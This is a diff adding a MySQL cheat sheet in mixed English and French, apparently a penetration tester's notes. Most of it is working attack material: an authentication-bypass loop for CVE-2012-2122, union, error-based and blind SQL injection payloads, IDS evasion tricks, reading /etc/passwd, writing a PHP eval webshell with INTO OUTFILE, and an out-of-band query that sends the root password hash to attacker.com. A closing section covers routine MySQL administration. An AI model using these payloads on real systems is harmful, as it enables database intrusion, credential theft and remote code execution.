@@ -1,0 +1,121 @@
+# mysql
+
+# auth bypass
+https://community.rapid7.com/community/metasploit/blog/2012/06/11/cve-2012-2122-a-tragically-comedic-security-flaw-in-mysql
+for i in `seq 1 1000`; do mysql -u root --password=bad -h 127.0.0.1 2>/dev/null; done
+auxiliary/scanner/mysql/mysql_authbypass_hashdump
+
+# SQLi-fu
+select user(),database(),version(),@@datadir,5
+select load_file('/etc/passwd') or SELECT CAST(load_file( '/etc/apache2/sites-enabled/000-default') AS char) 
+select "<?php eval($_REQUEST['c']); ?>",2,3,4 INTO OUTFILE "/var/www/html/temp/webshell.php" -- # or use eval()
+CONNECTION_ID() # fp
+
+# multibyte to bypass mysql-real-escape-string (db driver and db don't talk same charset) http://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql
+login=%bf%27+or+1=1%23 (?)
+login=%a5%26+or+1=1%23 (shift-js)
+
+# evasion
+mysql allow chars from 09, 0A-0D, A0 to be used as whitespaces
+select 1,info from information_schema.processlist # afficher la requete SQL
+and 1=1 procedure analyse() # afficher les noms des colonnes du select
+evade IDS with information_schema.{key_column_usage,table_constraints,statistics,partitions}
+select -> select%23randomText%0A and user() -> user%23randomText%0A() # see sqlmap tamper scripts
+
+# group_concat to get everything in one line and one column
+select group_concat(schema_name separator 0x2c) from information_schema.schemata;
+select group_concat(table_name,0x2e,column_name,0x0a) from information_schema.columns where table_schema='sqlilabs';
+
+# injection in insert, update, delete statements
+http://dl.packetstormsecurity.net/papers/database/SQLi_Insert.pdf
+DELETE FROM users WHERE id=1 or (SELECT * FROM (SELECT(name_const(version(),1)),name_const(version(),1))a) or '';
+INSERT INTO users (id, username, password) VALUES (1,'Olivia ' or (SELECT * FROM (SELECT name_const((SELECT 2),1),name_const((SELECT 2),1))a) or '', 'Nervo');
+INSERT INTO users (id, username, password) VALUES (1,'Olivia' or (SELECT 1 FROM (SELECT count(*),concat((SELECT (SELECT concat(0x7e,0x27,cast(database() as char),0x27,0x7e)) FROM information_schema.tables limit 0,1),floor(rand(0)*2))x FROM information_schema.columns group by x)a) or '', 'Nervo'); # double query injection
+
+# injection in limit (can't have union after order by see http://raijee1337.blogspot.com.au/2015/07/bypassing-incorrect-usage-of-union-and-order-by.html)
+LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);
+https://rdot.org/forum/showpost.php?p=36186&postcount=30
+
+# union based
+fr' order by 1--%20
+fr' union select 'a','b'# # trouver le type de chaque colonne (chaine, entier, date, ...)
+fr' union select @@version,'b'/* # trouver le numero de version
+
+select 'a',table_name from information_schema.tables # lister les tables de la base
+select 'a',column_name from information_schema.columns where table_name='accounts' # lister les colonnes
+select user,password from mysql.users # lire le contenu des tables
+select concat_ws(0x3a,host,user,password) from user # concatener
+
+# error based
+lang=fr' AND (select 1 from (select count(*), concat(0x3a64616a3a,(select version()),0x3a64616a3a,floor(rand(0)*2))as a from information_schema.tables group by a)x) AND 'a'='a # also see double query injection
+lang=fr' AND (select 1 from (select count(*), concat(0x3a64616a3a,(select version()),0x3a64616a3a,floor(rand(0)*2))as a from information_schema.tables group by a)x limit 0,1) AND 'a'='a # if subquery returns more than 1 row
+?id=0 or updatexml(1,concat(0x7e,(version())),0) or
+?id=0 or extractvalue('<xml>',concat("/",(select version())))
+?id=0 or extractvalue(null,concat(0x3a,version()))
+?id=0 or (select*from(select(name_const(version(),1)),name_const(version(),1))a) or
+?id=0 or (select 1 REGEXP if(1=1,'+','.'))
+
+# boolean blind based
+lang=en'%20and%20benchmark(20000000%2csha1(1))--%20
+
+# time blind based
+lang=en' AND SLEEP(5)
+lang=existe_pas' OR sleep(2) # will sleep 2 seconds for each record
+
+dbms=mysql&id=1+and+IF((ASCII(SUBSTR((SELECT+1337),${char_index:1},1))${comparator:>}${char_val:0}),SLEEP(2),1)
+
+# turn time based into boolean based
+select 1 REGEXP IF(1=[12],'+','.'); // same with rlike
+select extractvalue('<x>', if(1=[12],'','/')); // may work with other xml functions like updatexml etc.
+select (case when (1=1) then 1 else 1*(select 1 from information_schema.character_sets) end)
+
+# outband
+?id=0 or (SELECT LOAD_FILE(CONCAT(,(SELECT password FROM mysql.user WHERE user=root LIMIT 1),.attacker.com)) ...
+
+# Auditing 
+mysqlaudit.py
+
+# recuperer fichier de configuration
+le my.cnf réellement utilisé (verifier avec lsof ou ps fauxww)
+
+# si configuration avec replication
+# sur le master
+show master status;
+# sur chaque slave
+show slave status\G
+
+# verifier que les fichiers log ne sont pas vides
+
+# usage
+# creer une table
+create table blah (id int(11) not null, libelle varchar(30));
+insert into blah (id, libelle) values (1, 'blah');
+
+# creer/supprimer un utilisateur
+# mieux vaut toujours preciser le host car c'est @'%' par defaut sinon.
+GRANT ALL PRIVILEGES ON mabdd.* TO 'monty'@'localhost' identified by 'p@ssw0rd';
+GRANT select,update on mabdd.* TO 'monty'@'localhost' identified by 'some_password';
+DROP USER 'monty'@'localhost';
+CREATE USER 'monty'@'localhost' IDENTIFIED BY 'some_password';
+FLUSH PRIVILEGES;
+
+# Password cracking
+http://www.tobtu.com/mysql323.php # old mysql hash
+
+# gui
+https://www.mysql.com/products/workbench/
+
+# optimization
+http://websec.ca/blog/view/optimized_blind_sql_injection_data_retrieval
+http://blog.k3170makan.com/2013/10/even-faster-blind-sql-injection-methods.html
+http://ha.xxor.se/2011/06/speeding-up-blind-sql-injections-using.html
+
+# code exec
+udf (sqlmap or https://github.com/hatRiot/sql3_udf)
+
+# recover root pw
+http://www.percona.com/blog/2014/12/10/recover-mysql-root-password-without-restarting-mysql-no-downtime/
+
+# rdot advanced tricks
+https://rdot.org/forum/showthread.php?p=37133
+https://rdot.org/forum/showthread.php?t=3167
